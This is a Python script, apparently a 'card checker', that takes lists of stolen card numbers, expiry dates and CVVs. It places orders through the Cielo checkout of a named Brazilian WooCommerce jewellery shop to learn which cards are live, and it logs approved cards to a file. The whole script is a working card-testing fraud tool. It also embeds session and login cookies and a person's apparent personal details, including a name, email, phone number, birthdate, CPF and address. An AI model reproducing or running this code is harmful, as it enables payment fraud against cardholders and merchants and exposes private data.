import requests,json
from bs4 import BeautifulSoup
import re
import random,string
from colorama import init, Fore
import time
from urllib.parse import urlparse, parse_qs
while True:
    init()
    card_type = input("lista:")
    dados_cartao = card_type.split("|")
    cartao = dados_cartao[0]
    mes = dados_cartao[1]
    ano = dados_cartao[2]
    cvv = dados_cartao[3]
    bloco1 = cartao[0:4]
    bloco2 = cartao[4:8]
    bloco3 = cartao[8:12]
    bloco4 = cartao[12:]
    bin = cartao[0:6]
    headers = {
    'authority': '',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary7wq6rbmNJvb3VlwN',
    'cookie': '_fbp=fb.2.1688171611552.1857630329; cerber_groove=beaf2a1ec6825cdb91112ec9357b9e60; cerber_groove_x_hiOwjmUIz0t17ra9lBufsE8egW6pq=BNMDlJhAG0UfYX6sbOF1iaroPq; tk_ai=on4m%2BuSAQ4dJJZ7Xg%2B9t0wZv; energyplus-session=a40a2bf1cb0cb79ac2b55bff24fe542b; wordpress_test_cookie=WP%20Cookie%20check; _gid=GA1.3.1730099551.1688432779; _ga=GA1.1.72786669.1688171605; _lscache_vary=8b519ff8da7fed4936eb04efceaad0fb; wordpress_logged_in_bb37a25c7663cf6840d6a695b17c3e69=vfnfnndn%7C1689642493%7CP2ihM3jdck26Hq8WKhWZ1ZMCEK8zdHHe7Lp7hu8hFPD%7Cd35389b0e530918930c813fde57977bcba92079577e1517a680ebfa6c6deecb9; _ga_6205G5TESK=GS1.1.1688432778.2.1.1688432819.19.0.0; _ga_BQ7GSYGMYM=GS1.1.1688432779.2.1.1688432819.0.0.0; _ga_BDLGKJ11W3=GS1.1.1688432779.2.1.1688432819.0.0.0; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; tk_qs=',
    'origin': '',
    'referer': '',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
}

    data = '------WebKitFormBoundary7wq6rbmNJvb3VlwN\r\nContent-Disposition: form-data; name="quantity"\r\n\r\n1\r\n------WebKitFormBoundary7wq6rbmNJvb3VlwN\r\nContent-Disposition: form-data; name="add-to-cart"\r\n\r\n1861\r\n------WebKitFormBoundary7wq6rbmNJvb3VlwN\r\nContent-Disposition: form-data; name="wscp-postcode"\r\n\r\n\r\n------WebKitFormBoundary7wq6rbmNJvb3VlwN\r\nContent-Disposition: form-data; name="wscp-nonce"\r\n\r\n48a692e73e\r\n------WebKitFormBoundary7wq6rbmNJvb3VlwN--\r\n'

    response = requests.post(
        '',
        headers=headers,
        data=data,
    )


    headers = {
    'authority': 'www.lojaprataforte.com.br',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    'cookie': '_fbp=fb.2.1688171611552.1857630329; cerber_groove=beaf2a1ec6825cdb91112ec9357b9e60; cerber_groove_x_hiOwjmUIz0t17ra9lBufsE8egW6pq=BNMDlJhAG0UfYX6sbOF1iaroPq; tk_ai=on4m%2BuSAQ4dJJZ7Xg%2B9t0wZv; energyplus-session=a40a2bf1cb0cb79ac2b55bff24fe542b; wordpress_test_cookie=WP%20Cookie%20check; _gid=GA1.3.1730099551.1688432779; _ga=GA1.1.72786669.1688171605; _lscache_vary=8b519ff8da7fed4936eb04efceaad0fb; wordpress_logged_in_bb37a25c7663cf6840d6a695b17c3e69=vfnfnndn%7C1689642493%7CP2ihM3jdck26Hq8WKhWZ1ZMCEK8zdHHe7Lp7hu8hFPD%7Cd35389b0e530918930c813fde57977bcba92079577e1517a680ebfa6c6deecb9; _ga_6205G5TESK=GS1.1.1688432778.2.1.1688432819.19.0.0; _ga_BQ7GSYGMYM=GS1.1.1688432779.2.1.1688432819.0.0.0; _ga_BDLGKJ11W3=GS1.1.1688432779.2.1.1688432819.0.0.0; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; tk_qs=; woocommerce_items_in_cart=1; wp_woocommerce_session_bb37a25c7663cf6840d6a695b17c3e69=281%7C%7C1688605809%7C%7C1688602209%7C%7Cfbd7b4f854c7278a2d2d52ab73a3e0cf; woocommerce_cart_hash=eb5f8b8d17ef0bc906c50c10f5c46ebd',
    'referer': '',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
}

    response = requests.get('',headers=headers)

    headers = {
    'authority': '',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'cookie': '_fbp=fb.2.1688171611552.1857630329; cerber_groove=beaf2a1ec6825cdb91112ec9357b9e60; cerber_groove_x_hiOwjmUIz0t17ra9lBufsE8egW6pq=BNMDlJhAG0UfYX6sbOF1iaroPq; tk_ai=on4m%2BuSAQ4dJJZ7Xg%2B9t0wZv; wordpress_test_cookie=WP%20Cookie%20check; _gid=GA1.3.1730099551.1688432779; _ga=GA1.1.72786669.1688171605; _lscache_vary=8b519ff8da7fed4936eb04efceaad0fb; wordpress_logged_in_bb37a25c7663cf6840d6a695b17c3e69=vfnfnndn%7C1689642493%7CP2ihM3jdck26Hq8WKhWZ1ZMCEK8zdHHe7Lp7hu8hFPD%7Cd35389b0e530918930c813fde57977bcba92079577e1517a680ebfa6c6deecb9; _ga_6205G5TESK=GS1.1.1688432778.2.1.1688432819.19.0.0; _ga_BQ7GSYGMYM=GS1.1.1688432779.2.1.1688432819.0.0.0; _ga_BDLGKJ11W3=GS1.1.1688432779.2.1.1688432819.0.0.0; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; wp_woocommerce_session_bb37a25c7663cf6840d6a695b17c3e69=281%7C%7C1688605809%7C%7C1688602209%7C%7Cfbd7b4f854c7278a2d2d52ab73a3e0cf; energyplus-session=680c0c07e48c941207651dff4c63597d; tk_qs=; woocommerce_items_in_cart=1; woocommerce_cart_hash=eb5f8b8d17ef0bc906c50c10f5c46ebd',
    'referer': '',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
}

    response = requests.get('', headers=headers)
    soup = BeautifulSoup(response.content, 'html.parser')
    nonce_tag = soup.find('input', {'name': 'woocommerce-process-checkout-nonce'}) #cielo_webservice[hash]
    if nonce_tag:
        nonce = nonce_tag.get('value')


        headers = {
    'authority': '',
    'accept': '*/*',
    'accept-language': 'pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'cookie': '_fbp=fb.2.1688171611552.1857630329; cerber_groove=beaf2a1ec6825cdb91112ec9357b9e60; cerber_groove_x_hiOwjmUIz0t17ra9lBufsE8egW6pq=BNMDlJhAG0UfYX6sbOF1iaroPq; tk_ai=on4m%2BuSAQ4dJJZ7Xg%2B9t0wZv; wordpress_test_cookie=WP%20Cookie%20check; _gid=GA1.3.1730099551.1688432779; _ga=GA1.1.72786669.1688171605; _lscache_vary=8b519ff8da7fed4936eb04efceaad0fb; wordpress_logged_in_bb37a25c7663cf6840d6a695b17c3e69=vfnfnndn%7C1689642493%7CP2ihM3jdck26Hq8WKhWZ1ZMCEK8zdHHe7Lp7hu8hFPD%7Cd35389b0e530918930c813fde57977bcba92079577e1517a680ebfa6c6deecb9; _ga_6205G5TESK=GS1.1.1688432778.2.1.1688432819.19.0.0; _ga_BQ7GSYGMYM=GS1.1.1688432779.2.1.1688432819.0.0.0; _ga_BDLGKJ11W3=GS1.1.1688432779.2.1.1688432819.0.0.0; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; wp_woocommerce_session_bb37a25c7663cf6840d6a695b17c3e69=281%7C%7C1688605809%7C%7C1688602209%7C%7Cfbd7b4f854c7278a2d2d52ab73a3e0cf; energyplus-session=680c0c07e48c941207651dff4c63597d; woocommerce_items_in_cart=1; woocommerce_cart_hash=eb5f8b8d17ef0bc906c50c10f5c46ebd; tk_qs=',
    'origin': '',
    'referer': '',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
    'x-requested-with': 'XMLHttpRequest',
}

        params = {
    'wc-ajax': 'update_order_review',
    'wfacp_id': '364',
    'wfacp_is_checkout_override': 'yes',
}

        data = f'security=5d7ea34194&payment_method=loja5_woo_cielo_webservice&country=BR&state=PE&postcode=51300-040&city=Recife&address=Rua+Jaguar%C3%A9&address_2=&s_country=BR&s_state=PE&s_postcode=51300-040&s_city=Recife&s_address=Rua+Jaguar%C3%A9&s_address_2=&has_full_address=true&post_data=_wfacp_post_id%3D364%26wfacp_cart_hash%3D%26wfacp_has_active_multi_checkout%3D%26wfacp_source%3Dhttps%253A%252F%252Fwww.lojaprataforte.com.br%252Fcheckouts%252Fshopcheckout%252F%26product_switcher_need_refresh%3D0%26wfacp_cart_contains_subscription%3D0%26wfacp_exchange_keys%3D%257B%2522pre_built%2522%253A%257B%257D%257D%26wfacp_input_hidden_data%3D%257B%257D%26wfacp_input_phone_field%3D%257B%2522billing%2522%253A%257B%2522code%2522%253A%2522%2522%252C%2522number%2522%253A%2522%2522%257D%252C%2522shipping%2522%253A%257B%2522code%2522%253A%2522%2522%252C%2522number%2522%253A%2522%2522%257D%257D%26wfacp_timezone%3DAmerica%252FSao_Paulo%26wfacp_billing_address_present%3Dyes%26billing_email%3Dnaatyramos%2540hotmail.com%26billing_first_name%3DFelipe%26billing_last_name%3DBatista%26billing_phone%3D(99)%25208376-3653%26billing_birthdate%3D08%252F03%252F1994%26billing_persontype%3D1%26billing_cpf%3D481.768.937-49%26billing_cnpj%3D%26billing_ie%3D%26billing_company%3D%26billing_postcode%3D51300-040%26billing_address_1%3DRua%2520Jaguar%25C3%25A9%26billing_number%3D5063%26billing_address_2%3D%26billing_neighborhood%3DCOHAB%26billing_city%3DRecife%26billing_state%3DPE%26billing_country%3DBR%26shipping_postcode%3D51300-040%26shipping_address_1%3DRua%2520Jaguar%25C3%25A9%26shipping_number%3D506%26shipping_address_2%3D%26shipping_neighborhood%3DCOHAB%26shipping_city%3DRecife%26shipping_state%3DPE%26shipping_country%3DBR%26shipping_method%255B0%255D%3Dlocal_pickup%253A3%26order_comments%3D%26payment_method%3Dloja5_woo_cielo_webservice%26cielo_webservice%255Bhash_total_cielo%255D%3Da15d5e13ae60bbaa642c1c7b22b5091baf28695f%26cielo_webservice%255Btotal_cielo%255D%3D10.14%26cielo_webservice%255Btotal%255D%3D10.14%26cielo_webservice%255Bbandeira%255D%3D%26cielo_webservice%255Bhash%255D%3Da7ca45209008f2b0eb42e427980ecb25%26cielo_webservice%255Btime%255D%3D1688496100%26cielo_webservice%255Btitular%255D%3D%26cielo_webservice%255Bfiscal%255D%3D48176893749%26cielo_webservice%255Bnumero%255D%3D%26cielo_webservice%255Bvalidade_mes%255D%3D%26cielo_webservice%255Bvalidade_ano%255D%3D%26cielo_webservice%255Bcvv%255D%3D%26cielo_webservice%255Bparcela%255D%3D%26pagarme_payment_method%3Dbillet%26cr_customer_consent_field%3D1%26woocommerce-process-checkout-nonce%3D{nonce}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review%2526wfacp_id%253D364%2526wfacp_is_checkout_override%253Dyes%26shipping_first_name%3DFelipe%26shipping_last_name%3DBatista&shipping_method%5B0%5D=local_pickup%3A3'

        response = requests.post('', params=params,headers=headers, data=data)


        headers = {
    'authority': '',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'cookie': '_fbp=fb.2.1688171611552.1857630329; cerber_groove=beaf2a1ec6825cdb91112ec9357b9e60; cerber_groove_x_hiOwjmUIz0t17ra9lBufsE8egW6pq=BNMDlJhAG0UfYX6sbOF1iaroPq; tk_ai=on4m%2BuSAQ4dJJZ7Xg%2B9t0wZv; energyplus-session=a40a2bf1cb0cb79ac2b55bff24fe542b; wordpress_test_cookie=WP%20Cookie%20check; _gid=GA1.3.1730099551.1688432779; _ga=GA1.1.72786669.1688171605; _lscache_vary=8b519ff8da7fed4936eb04efceaad0fb; wordpress_logged_in_bb37a25c7663cf6840d6a695b17c3e69=vfnfnndn%7C1689642493%7CP2ihM3jdck26Hq8WKhWZ1ZMCEK8zdHHe7Lp7hu8hFPD%7Cd35389b0e530918930c813fde57977bcba92079577e1517a680ebfa6c6deecb9; _ga_6205G5TESK=GS1.1.1688432778.2.1.1688432819.19.0.0; _ga_BQ7GSYGMYM=GS1.1.1688432779.2.1.1688432819.0.0.0; _ga_BDLGKJ11W3=GS1.1.1688432779.2.1.1688432819.0.0.0; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; woocommerce_items_in_cart=1; wp_woocommerce_session_bb37a25c7663cf6840d6a695b17c3e69=281%7C%7C1688605809%7C%7C1688602209%7C%7Cfbd7b4f854c7278a2d2d52ab73a3e0cf; tk_qs=; woocommerce_cart_hash=76e7f20e58007d34649b1e7588bcd842',
    'origin': '',
    'referer': '',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
    'x-requested-with': 'XMLHttpRequest',
}

        params = {
            'wc-ajax': 'checkout',
            'wfacp_id': '364',
            'wfacp_is_checkout_override': 'yes',
        }

        data = f'_wfacp_post_id=364&wfacp_cart_hash=&wfacp_has_active_multi_checkout=&wfacp_source=https%3A%2F%2Fwww.lojaprataforte.com.br%2Fcheckouts%2Fshopcheckout%2F&product_switcher_need_refresh=0&wfacp_cart_contains_subscription=0&wfacp_exchange_keys=%7B%22pre_built%22%3A%7B%7D%7D&wfacp_input_hidden_data=%7B%7D&wfacp_input_phone_field=%7B%22billing%22%3A%7B%22code%22%3A%22%22%2C%22number%22%3A%22%22%7D%2C%22shipping%22%3A%7B%22code%22%3A%22%22%2C%22number%22%3A%22%22%7D%7D&wfacp_timezone=America%2FSao_Paulo&wfacp_billing_address_present=yes&billing_email=naatyramos@hotmail.com&billing_first_name=Felipe&billing_last_name=Batista&billing_phone=(99)+8376-3653&billing_birthdate=08%2F03%2F1994&billing_persontype=1&billing_cpf=481.768.937-49&billing_cnpj=&billing_ie=&billing_company=&billing_postcode=51300-040&billing_address_1=Rua+Jaguar%C3%A9&billing_number=506&billing_address_2=&billing_neighborhood=COHAB&billing_city=Recife&billing_state=PE&billing_country=BR&shipping_postcode=&shipping_address_1=&shipping_number=&shipping_address_2=&shipping_neighborhood=&shipping_city=&shipping_state=PE&shipping_country=BR&shipping_method%5B0%5D=FRENET_04391&order_comments=&payment_method=loja5_woo_cielo_webservice&cielo_webservice%5Bhash_total_cielo%5D=329e0a3bd5390443b9514715f9b8e6dc1bf21a9e&cielo_webservice%5Btotal_cielo%5D=27.74&cielo_webservice%5Btotal%5D=27.74&cielo_webservice%5Bbandeira%5D=mastercard&cielo_webservice%5Bhash%5D=a7ca45209008f2b0eb42e427980ecb25&cielo_webservice%5Btime%5D=1688433692&cielo_webservice%5Btitular%5D=JESSICA+DA+SILVA&cielo_webservice%5Bfiscal%5D=48176893749&cielo_webservice%5Bnumero%5D={cartao}&cielo_webservice%5Bvalidade_mes%5D={mes}&cielo_webservice%5Bvalidade_ano%5D={ano}&cielo_webservice%5Bcvv%5D=+++&cielo_webservice%5Bparcela%5D=MXwxfDI3Ljc0fGJXRnpkR1Z5WTJGeVpBPT18TWpjdU56UT18ZjcwMzMxZDM3M2UwOTE2YjIxZmM3N2RmZWRiNTdlMWI%3D&pagarme_payment_method=billet&cr_customer_consent_field=1&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review%26wfacp_id%3D364%26wfacp_is_checkout_override%3Dyes&shipping_first_name=Felipe&shipping_last_name=Batista'

        response = requests.post('', params=params,headers=headers, data=data)
        api = response.json()
        result = api['result']
        if 'failure' in result:
            print(Fore.YELLOW + f'#Erro -> {card_type} -> [NÂO TESTADO]')
            headers = {
    'authority': '',
    'accept': 'text/html, */*; q=0.01',
    'accept-language': 'pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'cookie': f'_fbp=fb.2.1688171611552.1857630329; cerber_groove=beaf2a1ec6825cdb91112ec9357b9e60; cerber_groove_x_hiOwjmUIz0t17ra9lBufsE8egW6pq=BNMDlJhAG0UfYX6sbOF1iaroPq; tk_ai=on4m%2BuSAQ4dJJZ7Xg%2B9t0wZv; wordpress_test_cookie=WP%20Cookie%20check; _gid=GA1.3.1730099551.1688432779; _ga=GA1.1.72786669.1688171605; _lscache_vary=8b519ff8da7fed4936eb04efceaad0fb; wordpress_logged_in_bb37a25c7663cf6840d6a695b17c3e69=vfnfnndn%7C1689642493%7CP2ihM3jdck26Hq8WKhWZ1ZMCEK8zdHHe7Lp7hu8hFPD%7Cd35389b0e530918930c813fde57977bcba92079577e1517a680ebfa6c6deecb9; _ga_6205G5TESK=GS1.1.1688432778.2.1.1688432819.19.0.0; _ga_BQ7GSYGMYM=GS1.1.1688432779.2.1.1688432819.0.0.0; _ga_BDLGKJ11W3=GS1.1.1688432779.2.1.1688432819.0.0.0; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; wp_woocommerce_session_bb37a25c7663cf6840d6a695b17c3e69=281%7C%7C1688605809%7C%7C1688602209%7C%7Cfbd7b4f854c7278a2d2d52ab73a3e0cf; energyplus-session=bd17e7f719f4992cc5a70e6d075dd464; woocommerce_items_in_cart=1; woocommerce_cart_hash=eb5f8b8d17ef0bc906c50c10f5c46ebd; tk_qs=pi%3D1861%26pq%3D1%26blog_id%3D214980319%26ui%3D214980319%253A281%26url%3Dhttps%253A%252F%252Fwww.lojaprataforte.com.br%26woo_version%3D7.8.2%26cart_page_contains_cart_block%3D0%26cart_page_contains_cart_shortcode%3D1%26checkout_page_contains_checkout_block%3D0%26checkout_page_contains_checkout_shortcode%3D1%26lr%3D%26or%3D%26r3d%3D%26_en%3Dwoocommerceanalytics_remove_from_cart%26_ui%3Don4m%252BuSAQ4dJJZ7Xg%252B9t0wZv%26_ut%3Danon%26_ts%3D1688497616397%26_tz%3D3%26_lg%3Dpt-BR%26_pf%3DWin32%26_ht%3D768%26_wd%3D1366%26_sx%3D0%26_sy%3D206.08694458007812%26_dl%3Dhttps%253A%252F%252Fwww.lojaprataforte.com.br%252Fmeu-carrinho%252F%26_dr%3Dhttps%253A%252F%252Fwww.lojaprataforte.com.br%252Fcheckout%252F%20pi%3D1861%26pq%3D1%26blog_id%3D214980319%26ui%3D214980319%253A281%26url%3Dhttps%253A%252F%252Fwww.lojaprataforte.com.br%26woo_version%3D7.8.2%26cart_page_contains_cart_block%3D0%26cart_page_contains_cart_shortcode%3D1%26checkout_page_contains_checkout_block%3D0%26checkout_page_contains_checkout_shortcode%3D1%26lr%3D%26or%3D%26r3d%3D%26_en%3Dwoocommerceanalytics_remove_from_cart%26_ui%3Don4m%252BuSAQ4dJJZ7Xg%252B9t0wZv%26_ut%3Danon%26_ts%3D1688497616411%26_tz%3D3%26_lg%3Dpt-BR%26_pf%3DWin32%26_ht%3D768%26_wd%3D1366%26_sx%3D0%26_sy%3D206.08694458007812%26_dl%3Dhttps%253A%252F%252Fwww.lojaprataforte.com.br%252Fmeu-carrinho%252F%26_dr%3Dhttps%253A%252F%252Fwww.lojaprataforte.com.br%252Fcheckout%252F',
    'referer': '',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
    'x-requested-with': 'XMLHttpRequest',
}

            params = {
            'remove_item': 'f9d1152547c0bde01830b7e8bd60024c',
            '_wpnonce': '0586f02b25',
        }

            response = requests.get('', params=params,headers=headers)
            headers = {
        'authority': 'www.lojaprataforte.com.br',
        'accept': 'text/html, */*; q=0.01',
        'accept-language': 'pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'cookie': '_fbp=fb.2.1688171611552.1857630329; cerber_groove=beaf2a1ec6825cdb91112ec9357b9e60; cerber_groove_x_hiOwjmUIz0t17ra9lBufsE8egW6pq=BNMDlJhAG0UfYX6sbOF1iaroPq; tk_ai=on4m%2BuSAQ4dJJZ7Xg%2B9t0wZv; wordpress_test_cookie=WP%20Cookie%20check; _gid=GA1.3.1730099551.1688432779; _ga=GA1.1.72786669.1688171605; _lscache_vary=8b519ff8da7fed4936eb04efceaad0fb; wordpress_logged_in_bb37a25c7663cf6840d6a695b17c3e69=vfnfnndn%7C1689642493%7CP2ihM3jdck26Hq8WKhWZ1ZMCEK8zdHHe7Lp7hu8hFPD%7Cd35389b0e530918930c813fde57977bcba92079577e1517a680ebfa6c6deecb9; _ga_6205G5TESK=GS1.1.1688432778.2.1.1688432819.19.0.0; _ga_BQ7GSYGMYM=GS1.1.1688432779.2.1.1688432819.0.0.0; _ga_BDLGKJ11W3=GS1.1.1688432779.2.1.1688432819.0.0.0; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; wp_woocommerce_session_bb37a25c7663cf6840d6a695b17c3e69=281%7C%7C1688605809%7C%7C1688602209%7C%7Cfbd7b4f854c7278a2d2d52ab73a3e0cf; energyplus-session=bd17e7f719f4992cc5a70e6d075dd464; tk_qs=',
        'referer': '',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
        'x-requested-with': 'XMLHttpRequest',
    }

            params = {
                'removed_item': '1',
            }

            response = requests.get('', params=params, headers=headers)
        else:
            pay = response.text
            link = pay.split('redirect":"')[1].split('"')[0]
            link = link.replace("\\/", "/")


            def px(content, start_str, end_str, index):
                return content.split(start_str, index)[-1].split(end_str, index)[0]

            headers = {
        'authority': '',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'cookie': '_fbp=fb.2.1688171611552.1857630329; cerber_groove=beaf2a1ec6825cdb91112ec9357b9e60; cerber_groove_x_hiOwjmUIz0t17ra9lBufsE8egW6pq=BNMDlJhAG0UfYX6sbOF1iaroPq; tk_ai=on4m%2BuSAQ4dJJZ7Xg%2B9t0wZv; energyplus-session=a40a2bf1cb0cb79ac2b55bff24fe542b; wordpress_test_cookie=WP%20Cookie%20check; _gid=GA1.3.1730099551.1688432779; _ga=GA1.1.72786669.1688171605; _lscache_vary=8b519ff8da7fed4936eb04efceaad0fb; wordpress_logged_in_bb37a25c7663cf6840d6a695b17c3e69=vfnfnndn%7C1689642493%7CP2ihM3jdck26Hq8WKhWZ1ZMCEK8zdHHe7Lp7hu8hFPD%7Cd35389b0e530918930c813fde57977bcba92079577e1517a680ebfa6c6deecb9; _ga_6205G5TESK=GS1.1.1688432778.2.1.1688432819.19.0.0; _ga_BQ7GSYGMYM=GS1.1.1688432779.2.1.1688432819.0.0.0; _ga_BDLGKJ11W3=GS1.1.1688432779.2.1.1688432819.0.0.0; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; wp_woocommerce_session_bb37a25c7663cf6840d6a695b17c3e69=281%7C%7C1688605809%7C%7C1688602209%7C%7Cfbd7b4f854c7278a2d2d52ab73a3e0cf; tk_qs=',
        'referer': '',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
    }

            response = requests.get(link,headers=headers)
            s = requests.Session()
            response = s.get(link, headers=headers)
            final = response.content.decode('utf-8')
            retorno = px(final, 'LR:</b> ',' &#8211', 1)
            if '00' in retorno:
                print(Fore.GREEN + f'#Aprovada -> {card_type} -> [R$21,87] -> GG LIVE :) -> @jssgen')
                live = f'#Aprovada -> {card_type} -> [R$21,87] -> GG LIVE :) -> @jssgen'
                with open('gg_live.txt', 'a', encoding='utf-8') as f:
                    f.write(str(live) + '\n')
            else:
                print(Fore.RED + f'#Reprovada -> {card_type} -> [R$21,87] -> GG DIE :( -> @jssgen')
                
                
            
    else:
        print(Fore.YELLOW + f'#Erro na api contatar o DEV!!')